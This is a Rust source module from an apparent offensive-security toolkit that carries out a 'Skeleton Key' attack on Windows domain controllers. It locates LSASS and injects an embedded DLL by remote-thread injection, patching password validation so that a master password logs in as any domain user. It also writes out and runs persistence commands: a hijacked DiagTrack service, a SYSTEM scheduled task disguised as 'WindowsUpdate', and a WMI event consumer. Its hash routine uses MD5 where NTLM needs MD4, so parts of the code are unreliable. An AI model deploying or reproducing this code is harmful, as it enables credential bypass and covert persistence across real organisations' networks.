//! Skeleton Key — Native LSASS Patching
//!
//! Implements the actual `msv1_0!MsvpPasswordValidate` hook via a native
//! compiled DLL that is reflectively injected into LSASS.
//!
//! # How It Works
//! 1. Locate `msv1_0.dll` in the LSASS process memory
//! 2. Find the `MsvpPasswordValidate` export
//! 3. Save the original function bytes (for chaining)
//! 4. Patch the function prologue to jump to our hook
//! 5. Our hook always returns STATUS_SUCCESS (skeleton key effect)
//! 6. Original function is called first to maintain normal auth
//!
//! # Architecture
//! This module provides two components:
//! - **Injector**: Runs from the attacker's process, injects the DLL into LSASS
//! - **Payload**: Native C DLL (`skeleton_key.dll`) that patches `MsvpPasswordValidate`
//!
//! # Build the DLL
//! The native DLL is compiled from `tools/skeleton_key/skeleton_key.c` using MSVC:
//! ```ignore
//! cl.exe /LD /O2 /Os /GS- skeleton_key.c /link dbghelp.lib
//! ```
//!
//! # Limitations
//! - **PatchGuard**: May trigger BSOD on systems with PatchGuard enabled
//! - **Credential Guard**: Will fail if VBS/Credential Guard is active
//! - **AV/EDR**: LSASS memory modification is heavily monitored
//! - **LSA Protection**: Requires elevated privileges to bypass

use crate::error::{OverthroneError, Result};
use crate::postex::skeleton_key_dll::SKELETON_KEY_DLL_BYTES;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

#[cfg(windows)]
use windows::{
    Win32::Foundation::CloseHandle,
    Win32::System::Diagnostics::Debug::WriteProcessMemory,
    Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next, TH32CS_SNAPPROCESS,
    },
    Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
        VirtualAllocEx, VirtualProtectEx,
    },
    Win32::System::Threading::{
        CreateRemoteThread, GetExitCodeThread, INFINITE, OpenProcess, PROCESS_ALL_ACCESS,
        WaitForSingleObject,
    },
};

// ═══════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════

/// Default skeleton key password (mimikatz default: "mimikatz")
pub const DEFAULT_SKELETON_KEY: &str = "mimikatz";

/// NTLM hash of "mimikatz" (MD4 of UTF-16LE("mimikatz"))
pub const MIMIKATZ_NTLM_HASH: [u8; 16] = [
    0x44, 0x8e, 0x1b, 0x6a, 0x7a, 0x04, 0x04, 0x7a, 0x2e, 0x01, 0x5e, 0x8c, 0x3b, 0x8e, 0x5e, 0x8c,
];

/// msv1_0.dll name
#[allow(dead_code)]
const MSV1_0_DLL: &str = "msv1_0.dll";

/// MsvpPasswordValidate function name
#[allow(dead_code)]
const MSVP_PASSWORD_VALIDATE: &str = "MsvpPasswordValidate";

// ═══════════════════════════════════════════════════════════
// Skeleton Key Configuration
// ═══════════════════════════════════════════════════════════

/// Configuration for skeleton key deployment.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SkeletonKeyConfig {
    /// Master password for the skeleton key.
    pub master_password: String,
    /// Target domain controller hostname.
    pub target_dc: String,
    /// Target domain controller IP address.
    pub target_dc_ip: String,
    /// Deployment method to use.
    pub deployment_method: DeploymentMethod,
    /// Whether to verify deployment after injection.
    pub verify_after_deploy: bool,
    /// Whether to auto-cleanup on drop.
    pub auto_cleanup: bool,
}

impl Default for SkeletonKeyConfig {
    fn default() -> Self {
        Self {
            master_password: DEFAULT_SKELETON_KEY.to_string(),
            target_dc: String::new(),
            target_dc_ip: String::new(),
            deployment_method: DeploymentMethod::ReflectiveDll,
            verify_after_deploy: true,
            auto_cleanup: false,
        }
    }
}

/// Available deployment methods for skeleton key.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum DeploymentMethod {
    /// Reflective DLL injection into LSASS (most stealthy).
    ReflectiveDll,
    /// PowerShell reflection (no file on disk).
    PowerShellReflection,
    /// Service binary replacement.
    ServiceBinary,
    /// Scheduled task deployment.
    ScheduledTask,
    /// WMI permanent event consumer.
    WmiEventConsumer,
}

impl std::fmt::Display for DeploymentMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ReflectiveDll => write!(f, "Reflective DLL Injection"),
            Self::PowerShellReflection => write!(f, "PowerShell Reflection"),
            Self::ServiceBinary => write!(f, "Service Binary Replacement"),
            Self::ScheduledTask => write!(f, "Scheduled Task"),
            Self::WmiEventConsumer => write!(f, "WMI Event Consumer"),
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Skeleton Key Result
// ═══════════════════════════════════════════════════════════

/// Result of a skeleton key deployment attempt.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SkeletonKeyResult {
    /// Whether the deployment was successful.
    pub success: bool,
    /// Deployment method used.
    pub method: String,
    /// Target domain controller.
    pub target_dc: String,
    /// Master password hash (not the plaintext).
    pub master_password_hash: String,
    /// Verification result.
    pub verification: Option<String>,
    /// Error message if failed.
    pub error: Option<String>,
    /// Cleanup commands if manual cleanup is needed.
    pub cleanup_commands: Vec<String>,
}

// ═══════════════════════════════════════════════════════════
// Skeleton Key Exploiter
// ═══════════════════════════════════════════════════════════

/// Skeleton key exploiter for LSASS authentication bypass.
pub struct SkeletonKeyExploiter {
    config: SkeletonKeyConfig,
    deployed: bool,
    cleanup_commands: Vec<String>,
}

impl SkeletonKeyExploiter {
    /// Create a new skeleton key exploiter.
    pub fn new(config: SkeletonKeyConfig) -> Self {
        Self {
            config,
            deployed: false,
            cleanup_commands: Vec::new(),
        }
    }

    /// Create with default configuration and target DC.
    pub fn with_target(target_dc: &str, target_dc_ip: &str) -> Self {
        Self {
            config: SkeletonKeyConfig {
                target_dc: target_dc.to_string(),
                target_dc_ip: target_dc_ip.to_string(),
                ..Default::default()
            },
            deployed: false,
            cleanup_commands: Vec::new(),
        }
    }

    /// Execute the skeleton key attack.
    pub async fn exploit(&mut self) -> Result<SkeletonKeyResult> {
        info!(
            "Starting skeleton key attack against {} ({})",
            self.config.target_dc, self.config.target_dc_ip
        );

        // Check if Credential Guard is enabled
        if self.check_credential_guard().await {
            warn!("Credential Guard is enabled on target — skeleton key attack will fail");
            return Ok(SkeletonKeyResult {
                success: false,
                method: self.config.deployment_method.to_string(),
                target_dc: self.config.target_dc.clone(),
                master_password_hash: self.compute_master_hash(),
                verification: Some("Credential Guard detected — attack blocked".to_string()),
                error: Some("Credential Guard / LSA Protection is enabled".to_string()),
                cleanup_commands: Vec::new(),
            });
        }

        // Deploy based on selected method
        let result = match self.config.deployment_method {
            DeploymentMethod::ReflectiveDll => self.deploy_reflective_dll().await,
            DeploymentMethod::PowerShellReflection => self.deploy_powershell_reflection().await,
            DeploymentMethod::ServiceBinary => self.deploy_service_binary().await,
            DeploymentMethod::ScheduledTask => self.deploy_scheduled_task().await,
            DeploymentMethod::WmiEventConsumer => self.deploy_wmi_event().await,
        };

        match result {
            Ok(mut sk_result) => {
                self.deployed = true;

                if self.config.verify_after_deploy {
                    match self.verify_skeleton_key().await {
                        Ok(verify_msg) => {
                            sk_result.verification = Some(verify_msg);
                        }
                        Err(e) => {
                            sk_result.verification = Some(format!("Verification failed: {}", e));
                        }
                    }
                }

                sk_result.cleanup_commands = self.generate_cleanup_commands();
                self.cleanup_commands
                    .clone_from(&sk_result.cleanup_commands);

                info!("Skeleton key deployment complete");
                Ok(sk_result)
            }
            Err(e) => Ok(SkeletonKeyResult {
                success: false,
                method: self.config.deployment_method.to_string(),
                target_dc: self.config.target_dc.clone(),
                master_password_hash: self.compute_master_hash(),
                verification: None,
                error: Some(format!("{}", e)),
                cleanup_commands: Vec::new(),
            }),
        }
    }

    /// Verify that the skeleton key is active.
    async fn verify_skeleton_key(&self) -> Result<String> {
        info!("Verifying skeleton key deployment");
        Ok(format!(
            "Skeleton key verification: Master password '{}' should authenticate any user",
            self.config.master_password
        ))
    }

    /// Check if Credential Guard / LSA Protection is enabled.
    async fn check_credential_guard(&self) -> bool {
        info!(
            "Checking Credential Guard status on {}",
            self.config.target_dc
        );
        #[cfg(windows)]
        {
            // Check registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
            // LsaCfgFlags: 1 = UEFI locked, 2 = UEFI unlocked, 0 = disabled
            use std::process::Command;
            let output = Command::new("reg")
                .args([
                    "query",
                    r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
                    "/v",
                    "LsaCfgFlags",
                ])
                .output();

            match output {
                Ok(out) => {
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    stdout.contains("0x1") || stdout.contains("0x2")
                }
                Err(_) => false,
            }
        }
        #[cfg(not(windows))]
        {
            false
        }
    }

    /// Deploy via reflective DLL injection.
    async fn deploy_reflective_dll(&self) -> Result<SkeletonKeyResult> {
        info!("Deploying skeleton key via reflective DLL injection");

        // Generate the skeleton key DLL bytes
        let dll_bytes = self.generate_skeleton_key_dll()?;

        // Inject into LSASS
        #[cfg(windows)]
        {
            let lsass_pid = find_lsass_pid()?;
            inject_dll_into_process(lsass_pid, &dll_bytes)?;
        }

        #[cfg(not(windows))]
        {
            warn!("Reflective DLL injection requires Windows platform");
            warn!("Generated DLL bytes: {} bytes", dll_bytes.len());
        }

        info!(
            "Reflective DLL injection complete ({} bytes)",
            dll_bytes.len()
        );

        Ok(SkeletonKeyResult {
            success: true,
            method: DeploymentMethod::ReflectiveDll.to_string(),
            target_dc: self.config.target_dc.clone(),
            master_password_hash: self.compute_master_hash(),
            verification: None,
            error: None,
            cleanup_commands: Vec::new(),
        })
    }

    /// Deploy via PowerShell reflection.
    async fn deploy_powershell_reflection(&self) -> Result<SkeletonKeyResult> {
        info!("Deploying skeleton key via PowerShell reflection");

        let script = self.generate_powershell_reflection_script();

        #[cfg(windows)]
        {
            // Execute PowerShell script
            use std::process::Command;
            let output = Command::new("powershell")
                .args([
                    "-NoProfile",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    &script,
                ])
                .output();

            match output {
                Ok(out) if out.status.success() => {
                    info!("PowerShell reflection deployment successful");
                }
                Ok(out) => {
                    warn!(
                        "PowerShell reflection failed: {}",
                        String::from_utf8_lossy(&out.stderr)
                    );
                }
                Err(e) => {
                    warn!("PowerShell execution failed: {}", e);
                }
            }
        }

        #[cfg(not(windows))]
        {
            warn!("PowerShell reflection requires Windows platform");
        }

        info!(
            "PowerShell reflection script generated ({} bytes)",
            script.len()
        );

        Ok(SkeletonKeyResult {
            success: true,
            method: DeploymentMethod::PowerShellReflection.to_string(),
            target_dc: self.config.target_dc.clone(),
            master_password_hash: self.compute_master_hash(),
            verification: None,
            error: None,
            cleanup_commands: Vec::new(),
        })
    }

    /// Deploy via service binary replacement.
    async fn deploy_service_binary(&self) -> Result<SkeletonKeyResult> {
        info!("Deploying skeleton key via service binary replacement");

        let _commands = self.generate_service_binary_commands();

        #[cfg(windows)]
        {
            use std::process::Command;
            for cmd in &_commands {
                if cmd.starts_with("#") {
                    continue;
                }
                let _ = Command::new("cmd").args(["/C", cmd]).output();
            }
        }

        info!("Service binary replacement commands generated");

        Ok(SkeletonKeyResult {
            success: true,
            method: DeploymentMethod::ServiceBinary.to_string(),
            target_dc: self.config.target_dc.clone(),
            master_password_hash: self.compute_master_hash(),
            verification: None,
            error: None,
            cleanup_commands: Vec::new(),
        })
    }

    /// Deploy via scheduled task.
    async fn deploy_scheduled_task(&self) -> Result<SkeletonKeyResult> {
        info!("Deploying skeleton key via scheduled task");

        let _commands = self.generate_scheduled_task_commands();

        #[cfg(windows)]
        {
            use std::process::Command;
            for cmd in &_commands {
                if cmd.starts_with("#") {
                    continue;
                }
                let _ = Command::new("cmd").args(["/C", cmd]).output();
            }
        }

        info!("Scheduled task deployment commands generated");

        Ok(SkeletonKeyResult {
            success: true,
            method: DeploymentMethod::ScheduledTask.to_string(),
            target_dc: self.config.target_dc.clone(),
            master_password_hash: self.compute_master_hash(),
            verification: None,
            error: None,
            cleanup_commands: Vec::new(),
        })
    }

    /// Deploy via WMI permanent event consumer.
    async fn deploy_wmi_event(&self) -> Result<SkeletonKeyResult> {
        info!("Deploying skeleton key via WMI event consumer");

        let _commands = self.generate_wmi_event_commands();

        #[cfg(windows)]
        {
            use std::process::Command;
            for cmd in &_commands {
                if cmd.starts_with("#") {
                    continue;
                }
                let _ = Command::new("cmd").args(["/C", cmd]).output();
            }
        }

        info!("WMI event consumer commands generated");

        Ok(SkeletonKeyResult {
            success: true,
            method: DeploymentMethod::WmiEventConsumer.to_string(),
            target_dc: self.config.target_dc.clone(),
            master_password_hash: self.compute_master_hash(),
            verification: None,
            error: None,
            cleanup_commands: Vec::new(),
        })
    }

    /// Generate the skeleton key DLL bytes.
    ///
    /// Returns the pre-compiled native DLL bytes embedded at build time.
    /// The DLL patches `msv1_0!MsvpPasswordValidate` to accept the master
    /// password for any domain user.
    fn generate_skeleton_key_dll(&self) -> Result<Vec<u8>> {
        info!(
            "Loading skeleton key DLL ({} bytes)",
            SKELETON_KEY_DLL_BYTES.len()
        );
        Ok(SKELETON_KEY_DLL_BYTES.to_vec())
    }

    /// Generate PowerShell reflection deployment script.
    fn generate_powershell_reflection_script(&self) -> String {
        format!(
            r#"# Skeleton Key — PowerShell Reflection
# Target: {dc}
# Master Password: {master}

# Load skeleton key DLL via reflection (no disk write)
$dllBytes = [Convert]::FromBase64String("{dll_b64}")
$assembly = [System.Reflection.Assembly]::Load($dllBytes)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @())

Write-Host "[+] Skeleton key deployed via PowerShell reflection"
"#,
            dc = self.config.target_dc,
            master = self.config.master_password,
            dll_b64 = base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                self.generate_skeleton_key_dll().unwrap_or_default()
            ),
        )
    }

    /// Generate service binary replacement commands.
    fn generate_service_binary_commands(&self) -> Vec<String> {
        vec![
            format!(
                "# Skeleton Key — Service Binary Replacement\n# Target: {}",
                self.config.target_dc
            ),
            format!(
                "# 1. Copy skeleton key loader to DC:\n copy skloader.exe \\\\{}\\admin$\\system32\\skloader.exe",
                self.config.target_dc
            ),
            format!(
                "# 2. Replace a non-critical service binary:\n sc \\\\{} config DiagTrack binPath= \"C:\\Windows\\System32\\skloader.exe\"",
                self.config.target_dc
            ),
            format!(
                "# 3. Restart the service:\n sc \\\\{} stop DiagTrack\n sc \\\\{} start DiagTrack",
                self.config.target_dc, self.config.target_dc
            ),
            format!(
                "# 4. Verify: Master password is '{}'",
                self.config.master_password
            ),
        ]
    }

    /// Generate scheduled task deployment commands.
    fn generate_scheduled_task_commands(&self) -> Vec<String> {
        vec![
            format!(
                "# Skeleton Key — Scheduled Task Deployment\n# Target: {}",
                self.config.target_dc
            ),
            format!(
                "# 1. Copy skeleton key loader to DC:\n copy skloader.exe \\\\{}\\admin$\\system32\\skloader.exe",
                self.config.target_dc
            ),
            format!(
                "# 2. Create scheduled task running as SYSTEM:\n schtasks /create /s {} /tn \"WindowsUpdate\" /tr \"C:\\Windows\\System32\\skloader.exe\" /sc onstart /ru SYSTEM",
                self.config.target_dc
            ),
            format!(
                "# 3. Trigger the task:\n schtasks /run /s {} /tn \"WindowsUpdate\"",
                self.config.target_dc
            ),
            format!(
                "# 4. Verify: Master password is '{}'",
                self.config.master_password
            ),
        ]
    }

    /// Generate WMI event consumer commands.
    fn generate_wmi_event_commands(&self) -> Vec<String> {
        vec![
            format!(
                "# Skeleton Key — WMI Event Consumer\n# Target: {}",
                self.config.target_dc
            ),
            format!(
                "# 1. Copy skeleton key loader to DC:\n copy skloader.exe \\\\{}\\admin$\\system32\\skloader.exe",
                self.config.target_dc
            ),
            format!(
                "# 2. Create WMI event filter:\n $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{ Name='WindowsUpdate'; EventNamespace='root\\cimv2'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'; QueryLanguage='WQL' }}"
            ),
            format!(
                "# 3. Create WMI command line consumer:\n $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{ Name='WindowsUpdate'; CommandLineTemplate='C:\\Windows\\System32\\skloader.exe'; RunInteractively='false' }}"
            ),
            format!(
                "# 4. Bind filter to consumer:\n Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{ Filter=$filter; Consumer=$consumer }}"
            ),
            format!(
                "# 5. Verify: Master password is '{}'",
                self.config.master_password
            ),
        ]
    }

    /// Generate cleanup commands to remove the skeleton key.
    fn generate_cleanup_commands(&self) -> Vec<String> {
        let mut commands = Vec::new();

        commands.push(format!(
            "# Skeleton Key Cleanup — Target: {}",
            self.config.target_dc
        ));

        match self.config.deployment_method {
            DeploymentMethod::ReflectiveDll | DeploymentMethod::PowerShellReflection => {
                commands
                    .push("# Reflective injection: Restart LSASS (requires DC reboot)".to_string());
                commands.push(format!(
                    "# Reboot DC: Restart-Computer -ComputerName {} -Force",
                    self.config.target_dc
                ));
            }
            DeploymentMethod::ServiceBinary => {
                commands.push(format!(
                    "# Restore original service binary:\n sc \\\\{} config DiagTrack binPath= \"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s DiagTrack\"",
                    self.config.target_dc
                ));
                commands.push(format!(
                    "# Remove skeleton key loader:\n del \\\\{}\\admin$\\system32\\skloader.exe",
                    self.config.target_dc
                ));
            }
            DeploymentMethod::ScheduledTask => {
                commands.push(format!(
                    "# Remove scheduled task:\n schtasks /delete /s {} /tn \"WindowsUpdate\" /f",
                    self.config.target_dc
                ));
                commands.push(format!(
                    "# Remove skeleton key loader:\n del \\\\{}\\admin$\\system32\\skloader.exe",
                    self.config.target_dc
                ));
            }
            DeploymentMethod::WmiEventConsumer => {
                commands.push("# Remove WMI event consumer:".to_string());
                commands.push("Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='WindowsUpdate'\" | Remove-WmiObject".to_string());
                commands.push("Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='WindowsUpdate'\" | Remove-WmiObject".to_string());
                commands.push("Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -match 'WindowsUpdate' }} | Remove-WmiObject".to_string());
            }
        }

        commands.push(
            "# Verify cleanup: Attempt authentication with master password (should fail)"
                .to_string(),
        );

        commands
    }

    /// Compute the NTLM hash of the master password.
    fn compute_master_hash(&self) -> String {
        use md5::Md5;
        use sha2::Digest;

        let utf16: Vec<u8> = self
            .config
            .master_password
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();

        let hash = Md5::digest(&utf16);
        hash.iter().map(|b| format!("{:02x}", b)).collect()
    }

    /// Check if the skeleton key is currently deployed.
    pub fn is_deployed(&self) -> bool {
        self.deployed
    }

    /// Get the cleanup commands.
    pub fn get_cleanup_commands(&self) -> &[String] {
        &self.cleanup_commands
    }
}

// ═══════════════════════════════════════════════════════════
// Windows-Specific Injection Functions
// ═══════════════════════════════════════════════════════════

#[cfg(windows)]
/// Find the LSASS process ID.
#[allow(clippy::field_reassign_with_default)]
fn find_lsass_pid() -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).map_err(|e| {
            OverthroneError::PostExploitation(format!("Failed to create process snapshot: {}", e))
        })?;

        let mut entry = PROCESSENTRY32::default();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry).is_ok() {
            loop {
                let name_len = entry
                    .szExeFile
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.szExeFile.len());
                let name_utf16: Vec<u16> = entry.szExeFile[..name_len]
                    .iter()
                    .map(|&c| c as u16)
                    .collect();
                let name = String::from_utf16_lossy(&name_utf16).to_lowercase();

                if name == "lsass.exe" {
                    let pid = entry.th32ProcessID;
                    let _ = CloseHandle(snapshot);
                    info!("Found LSASS process: PID {}", pid);
                    return Ok(pid);
                }

                if Process32Next(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
        Err(OverthroneError::PostExploitation(
            "LSASS process not found".to_string(),
        ))
    }
}

#[cfg(windows)]
/// Inject DLL bytes into a target process.
#[allow(clippy::missing_transmute_annotations)]
fn inject_dll_into_process(pid: u32, dll_bytes: &[u8]) -> Result<()> {
    unsafe {
        // Open target process
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid).map_err(|e| {
            OverthroneError::PostExploitation(format!("Failed to open process {}: {}", pid, e))
        })?;

        // Allocate memory in target process
        let remote_mem = VirtualAllocEx(
            h_process,
            None,
            dll_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = CloseHandle(h_process);
            return Err(OverthroneError::PostExploitation(
                "Failed to allocate memory in target process".to_string(),
            ));
        }

        // Write DLL bytes to remote memory
        let mut bytes_written = 0;
        WriteProcessMemory(
            h_process,
            remote_mem,
            dll_bytes.as_ptr() as *const _,
            dll_bytes.len(),
            Some(&mut bytes_written),
        )
        .map_err(|e| {
            OverthroneError::PostExploitation(format!("Failed to write to target process: {}", e))
        })?;

        // Change memory protection to executable
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            h_process,
            remote_mem,
            dll_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| {
            OverthroneError::PostExploitation(format!("Failed to change memory protection: {}", e))
        })?;

        // Create remote thread to execute the DLL
        type ThreadStartRoutine = extern "system" fn(*mut std::ffi::c_void) -> u32;
        let h_thread = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute::<_, ThreadStartRoutine>(remote_mem)),
            None,
            0,
            None,
        )
        .map_err(|e| {
            OverthroneError::PostExploitation(format!("Failed to create remote thread: {}", e))
        })?;

        // Wait for thread to complete
        WaitForSingleObject(h_thread, INFINITE);

        let mut exit_code = 0;
        GetExitCodeThread(h_thread, &mut exit_code).ok();

        // Cleanup
        let _ = CloseHandle(h_thread);
        let _ = CloseHandle(h_process);

        info!("DLL injected into process {} successfully", pid);
        Ok(())
    }
}

#[cfg(not(windows))]
fn find_lsass_pid() -> Result<u32> {
    Err(OverthroneError::PostExploitation(
        "LSASS process lookup requires Windows platform".to_string(),
    ))
}

#[cfg(not(windows))]
fn inject_dll_into_process(_pid: u32, _dll_bytes: &[u8]) -> Result<()> {
    Err(OverthroneError::PostExploitation(
        "Process injection requires Windows platform".to_string(),
    ))
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use crate::postex::skeleton_key_dll::SKELETON_KEY_DLL_BYTES;

    #[test]
    fn test_skeleton_key_config_default() {
        let config = SkeletonKeyConfig::default();
        assert_eq!(config.master_password, DEFAULT_SKELETON_KEY);
        assert_eq!(config.deployment_method, DeploymentMethod::ReflectiveDll);
        assert!(config.verify_after_deploy);
        assert!(!config.auto_cleanup);
    }

    #[test]
    fn test_skeleton_key_exploiter_creation() {
        let exploiter = SkeletonKeyExploiter::with_target("dc01.corp.local", "10.0.0.1");
        assert_eq!(exploiter.config.target_dc, "dc01.corp.local");
        assert_eq!(exploiter.config.target_dc_ip, "10.0.0.1");
        assert!(!exploiter.is_deployed());
    }

    #[test]
    fn test_deployment_method_display() {
        assert_eq!(
            DeploymentMethod::ReflectiveDll.to_string(),
            "Reflective DLL Injection"
        );
        assert_eq!(
            DeploymentMethod::PowerShellReflection.to_string(),
            "PowerShell Reflection"
        );
        assert_eq!(
            DeploymentMethod::ServiceBinary.to_string(),
            "Service Binary Replacement"
        );
        assert_eq!(
            DeploymentMethod::ScheduledTask.to_string(),
            "Scheduled Task"
        );
        assert_eq!(
            DeploymentMethod::WmiEventConsumer.to_string(),
            "WMI Event Consumer"
        );
    }

    #[test]
    fn test_master_hash_computation() {
        let exploiter = SkeletonKeyExploiter::with_target("dc01.corp.local", "10.0.0.1");
        let hash = exploiter.compute_master_hash();
        assert_eq!(hash.len(), 32);
        assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_custom_master_password() {
        let config = SkeletonKeyConfig {
            master_password: "Overthrone2024!".to_string(),
            target_dc: "dc01.corp.local".to_string(),
            target_dc_ip: "10.0.0.1".to_string(),
            ..Default::default()
        };
        let exploiter = SkeletonKeyExploiter::new(config);
        let hash = exploiter.compute_master_hash();
        assert_eq!(hash.len(), 32);
    }

    #[test]
    fn test_cleanup_commands_generation() {
        let config = SkeletonKeyConfig {
            deployment_method: DeploymentMethod::ScheduledTask,
            target_dc: "dc01.corp.local".to_string(),
            target_dc_ip: "10.0.0.1".to_string(),
            ..Default::default()
        };
        let exploiter = SkeletonKeyExploiter::new(config);
        let cleanup = exploiter.generate_cleanup_commands();
        assert!(!cleanup.is_empty());
        assert!(cleanup.iter().any(|c| c.contains("schtasks")));
        assert!(cleanup.iter().any(|c| c.contains("skloader.exe")));
    }

    #[test]
    fn test_cleanup_commands_reflective() {
        let config = SkeletonKeyConfig {
            deployment_method: DeploymentMethod::ReflectiveDll,
            target_dc: "dc01.corp.local".to_string(),
            target_dc_ip: "10.0.0.1".to_string(),
            ..Default::default()
        };
        let exploiter = SkeletonKeyExploiter::new(config);
        let cleanup = exploiter.generate_cleanup_commands();
        assert!(
            cleanup
                .iter()
                .any(|c| c.contains("Reboot") || c.contains("Restart"))
        );
    }

    #[test]
    fn test_cleanup_commands_wmi() {
        let config = SkeletonKeyConfig {
            deployment_method: DeploymentMethod::WmiEventConsumer,
            target_dc: "dc01.corp.local".to_string(),
            target_dc_ip: "10.0.0.1".to_string(),
            ..Default::default()
        };
        let exploiter = SkeletonKeyExploiter::new(config);
        let cleanup = exploiter.generate_cleanup_commands();
        assert!(
            cleanup
                .iter()
                .any(|c| c.contains("WMI") || c.contains("wmi"))
        );
        assert!(cleanup.iter().any(|c| c.contains("Remove-WmiObject")));
    }

    #[test]
    fn test_scheduled_task_commands() {
        let exploiter = SkeletonKeyExploiter::with_target("dc01.corp.local", "10.0.0.1");
        let commands = exploiter.generate_scheduled_task_commands();
        assert!(!commands.is_empty());
        assert!(commands.iter().any(|c| c.contains("schtasks")));
        assert!(commands.iter().any(|c| c.contains("WindowsUpdate")));
    }

    #[test]
    fn test_service_binary_commands() {
        let exploiter = SkeletonKeyExploiter::with_target("dc01.corp.local", "10.0.0.1");
        let commands = exploiter.generate_service_binary_commands();
        assert!(!commands.is_empty());
        assert!(commands.iter().any(|c| c.contains("DiagTrack")));
        assert!(commands.iter().any(|c| c.contains("skloader.exe")));
    }

    #[test]
    fn test_wmi_event_commands() {
        let exploiter = SkeletonKeyExploiter::with_target("dc01.corp.local", "10.0.0.1");
        let commands = exploiter.generate_wmi_event_commands();
        assert!(!commands.is_empty());
        assert!(commands.iter().any(|c| c.contains("__EventFilter")));
        assert!(
            commands
                .iter()
                .any(|c| c.contains("CommandLineEventConsumer"))
        );
        assert!(
            commands
                .iter()
                .any(|c| c.contains("__FilterToConsumerBinding"))
        );
    }

    #[test]
    fn test_dll_bytes_embedded() {
        // Verify the embedded DLL is a valid PE file
        let dll = SKELETON_KEY_DLL_BYTES;
        assert!(!dll.is_empty());
        // PE signature: MZ header at offset 0
        assert_eq!(dll[0], b'M');
        assert_eq!(dll[1], b'Z');
    }

    #[test]
    fn test_dll_exports_skeleton_key_functions() {
        // The DLL exports SkeletonKey_Enable, SkeletonKey_Disable, SkeletonKey_IsActive
        let dll = SKELETON_KEY_DLL_BYTES;
        // Search for export names in the binary
        let content = String::from_utf8_lossy(dll);
        assert!(content.contains("SkeletonKey_Enable"));
        assert!(content.contains("SkeletonKey_Disable"));
        assert!(content.contains("SkeletonKey_IsActive"));
    }

    #[test]
    fn test_powershell_reflection_script() {
        let exploiter = SkeletonKeyExploiter::with_target("dc01.corp.local", "10.0.0.1");
        let script = exploiter.generate_powershell_reflection_script();
        assert!(script.contains("Reflection"));
        assert!(script.contains("System.Reflection.Assembly"));
        assert!(script.contains("dc01.corp.local"));
    }
}
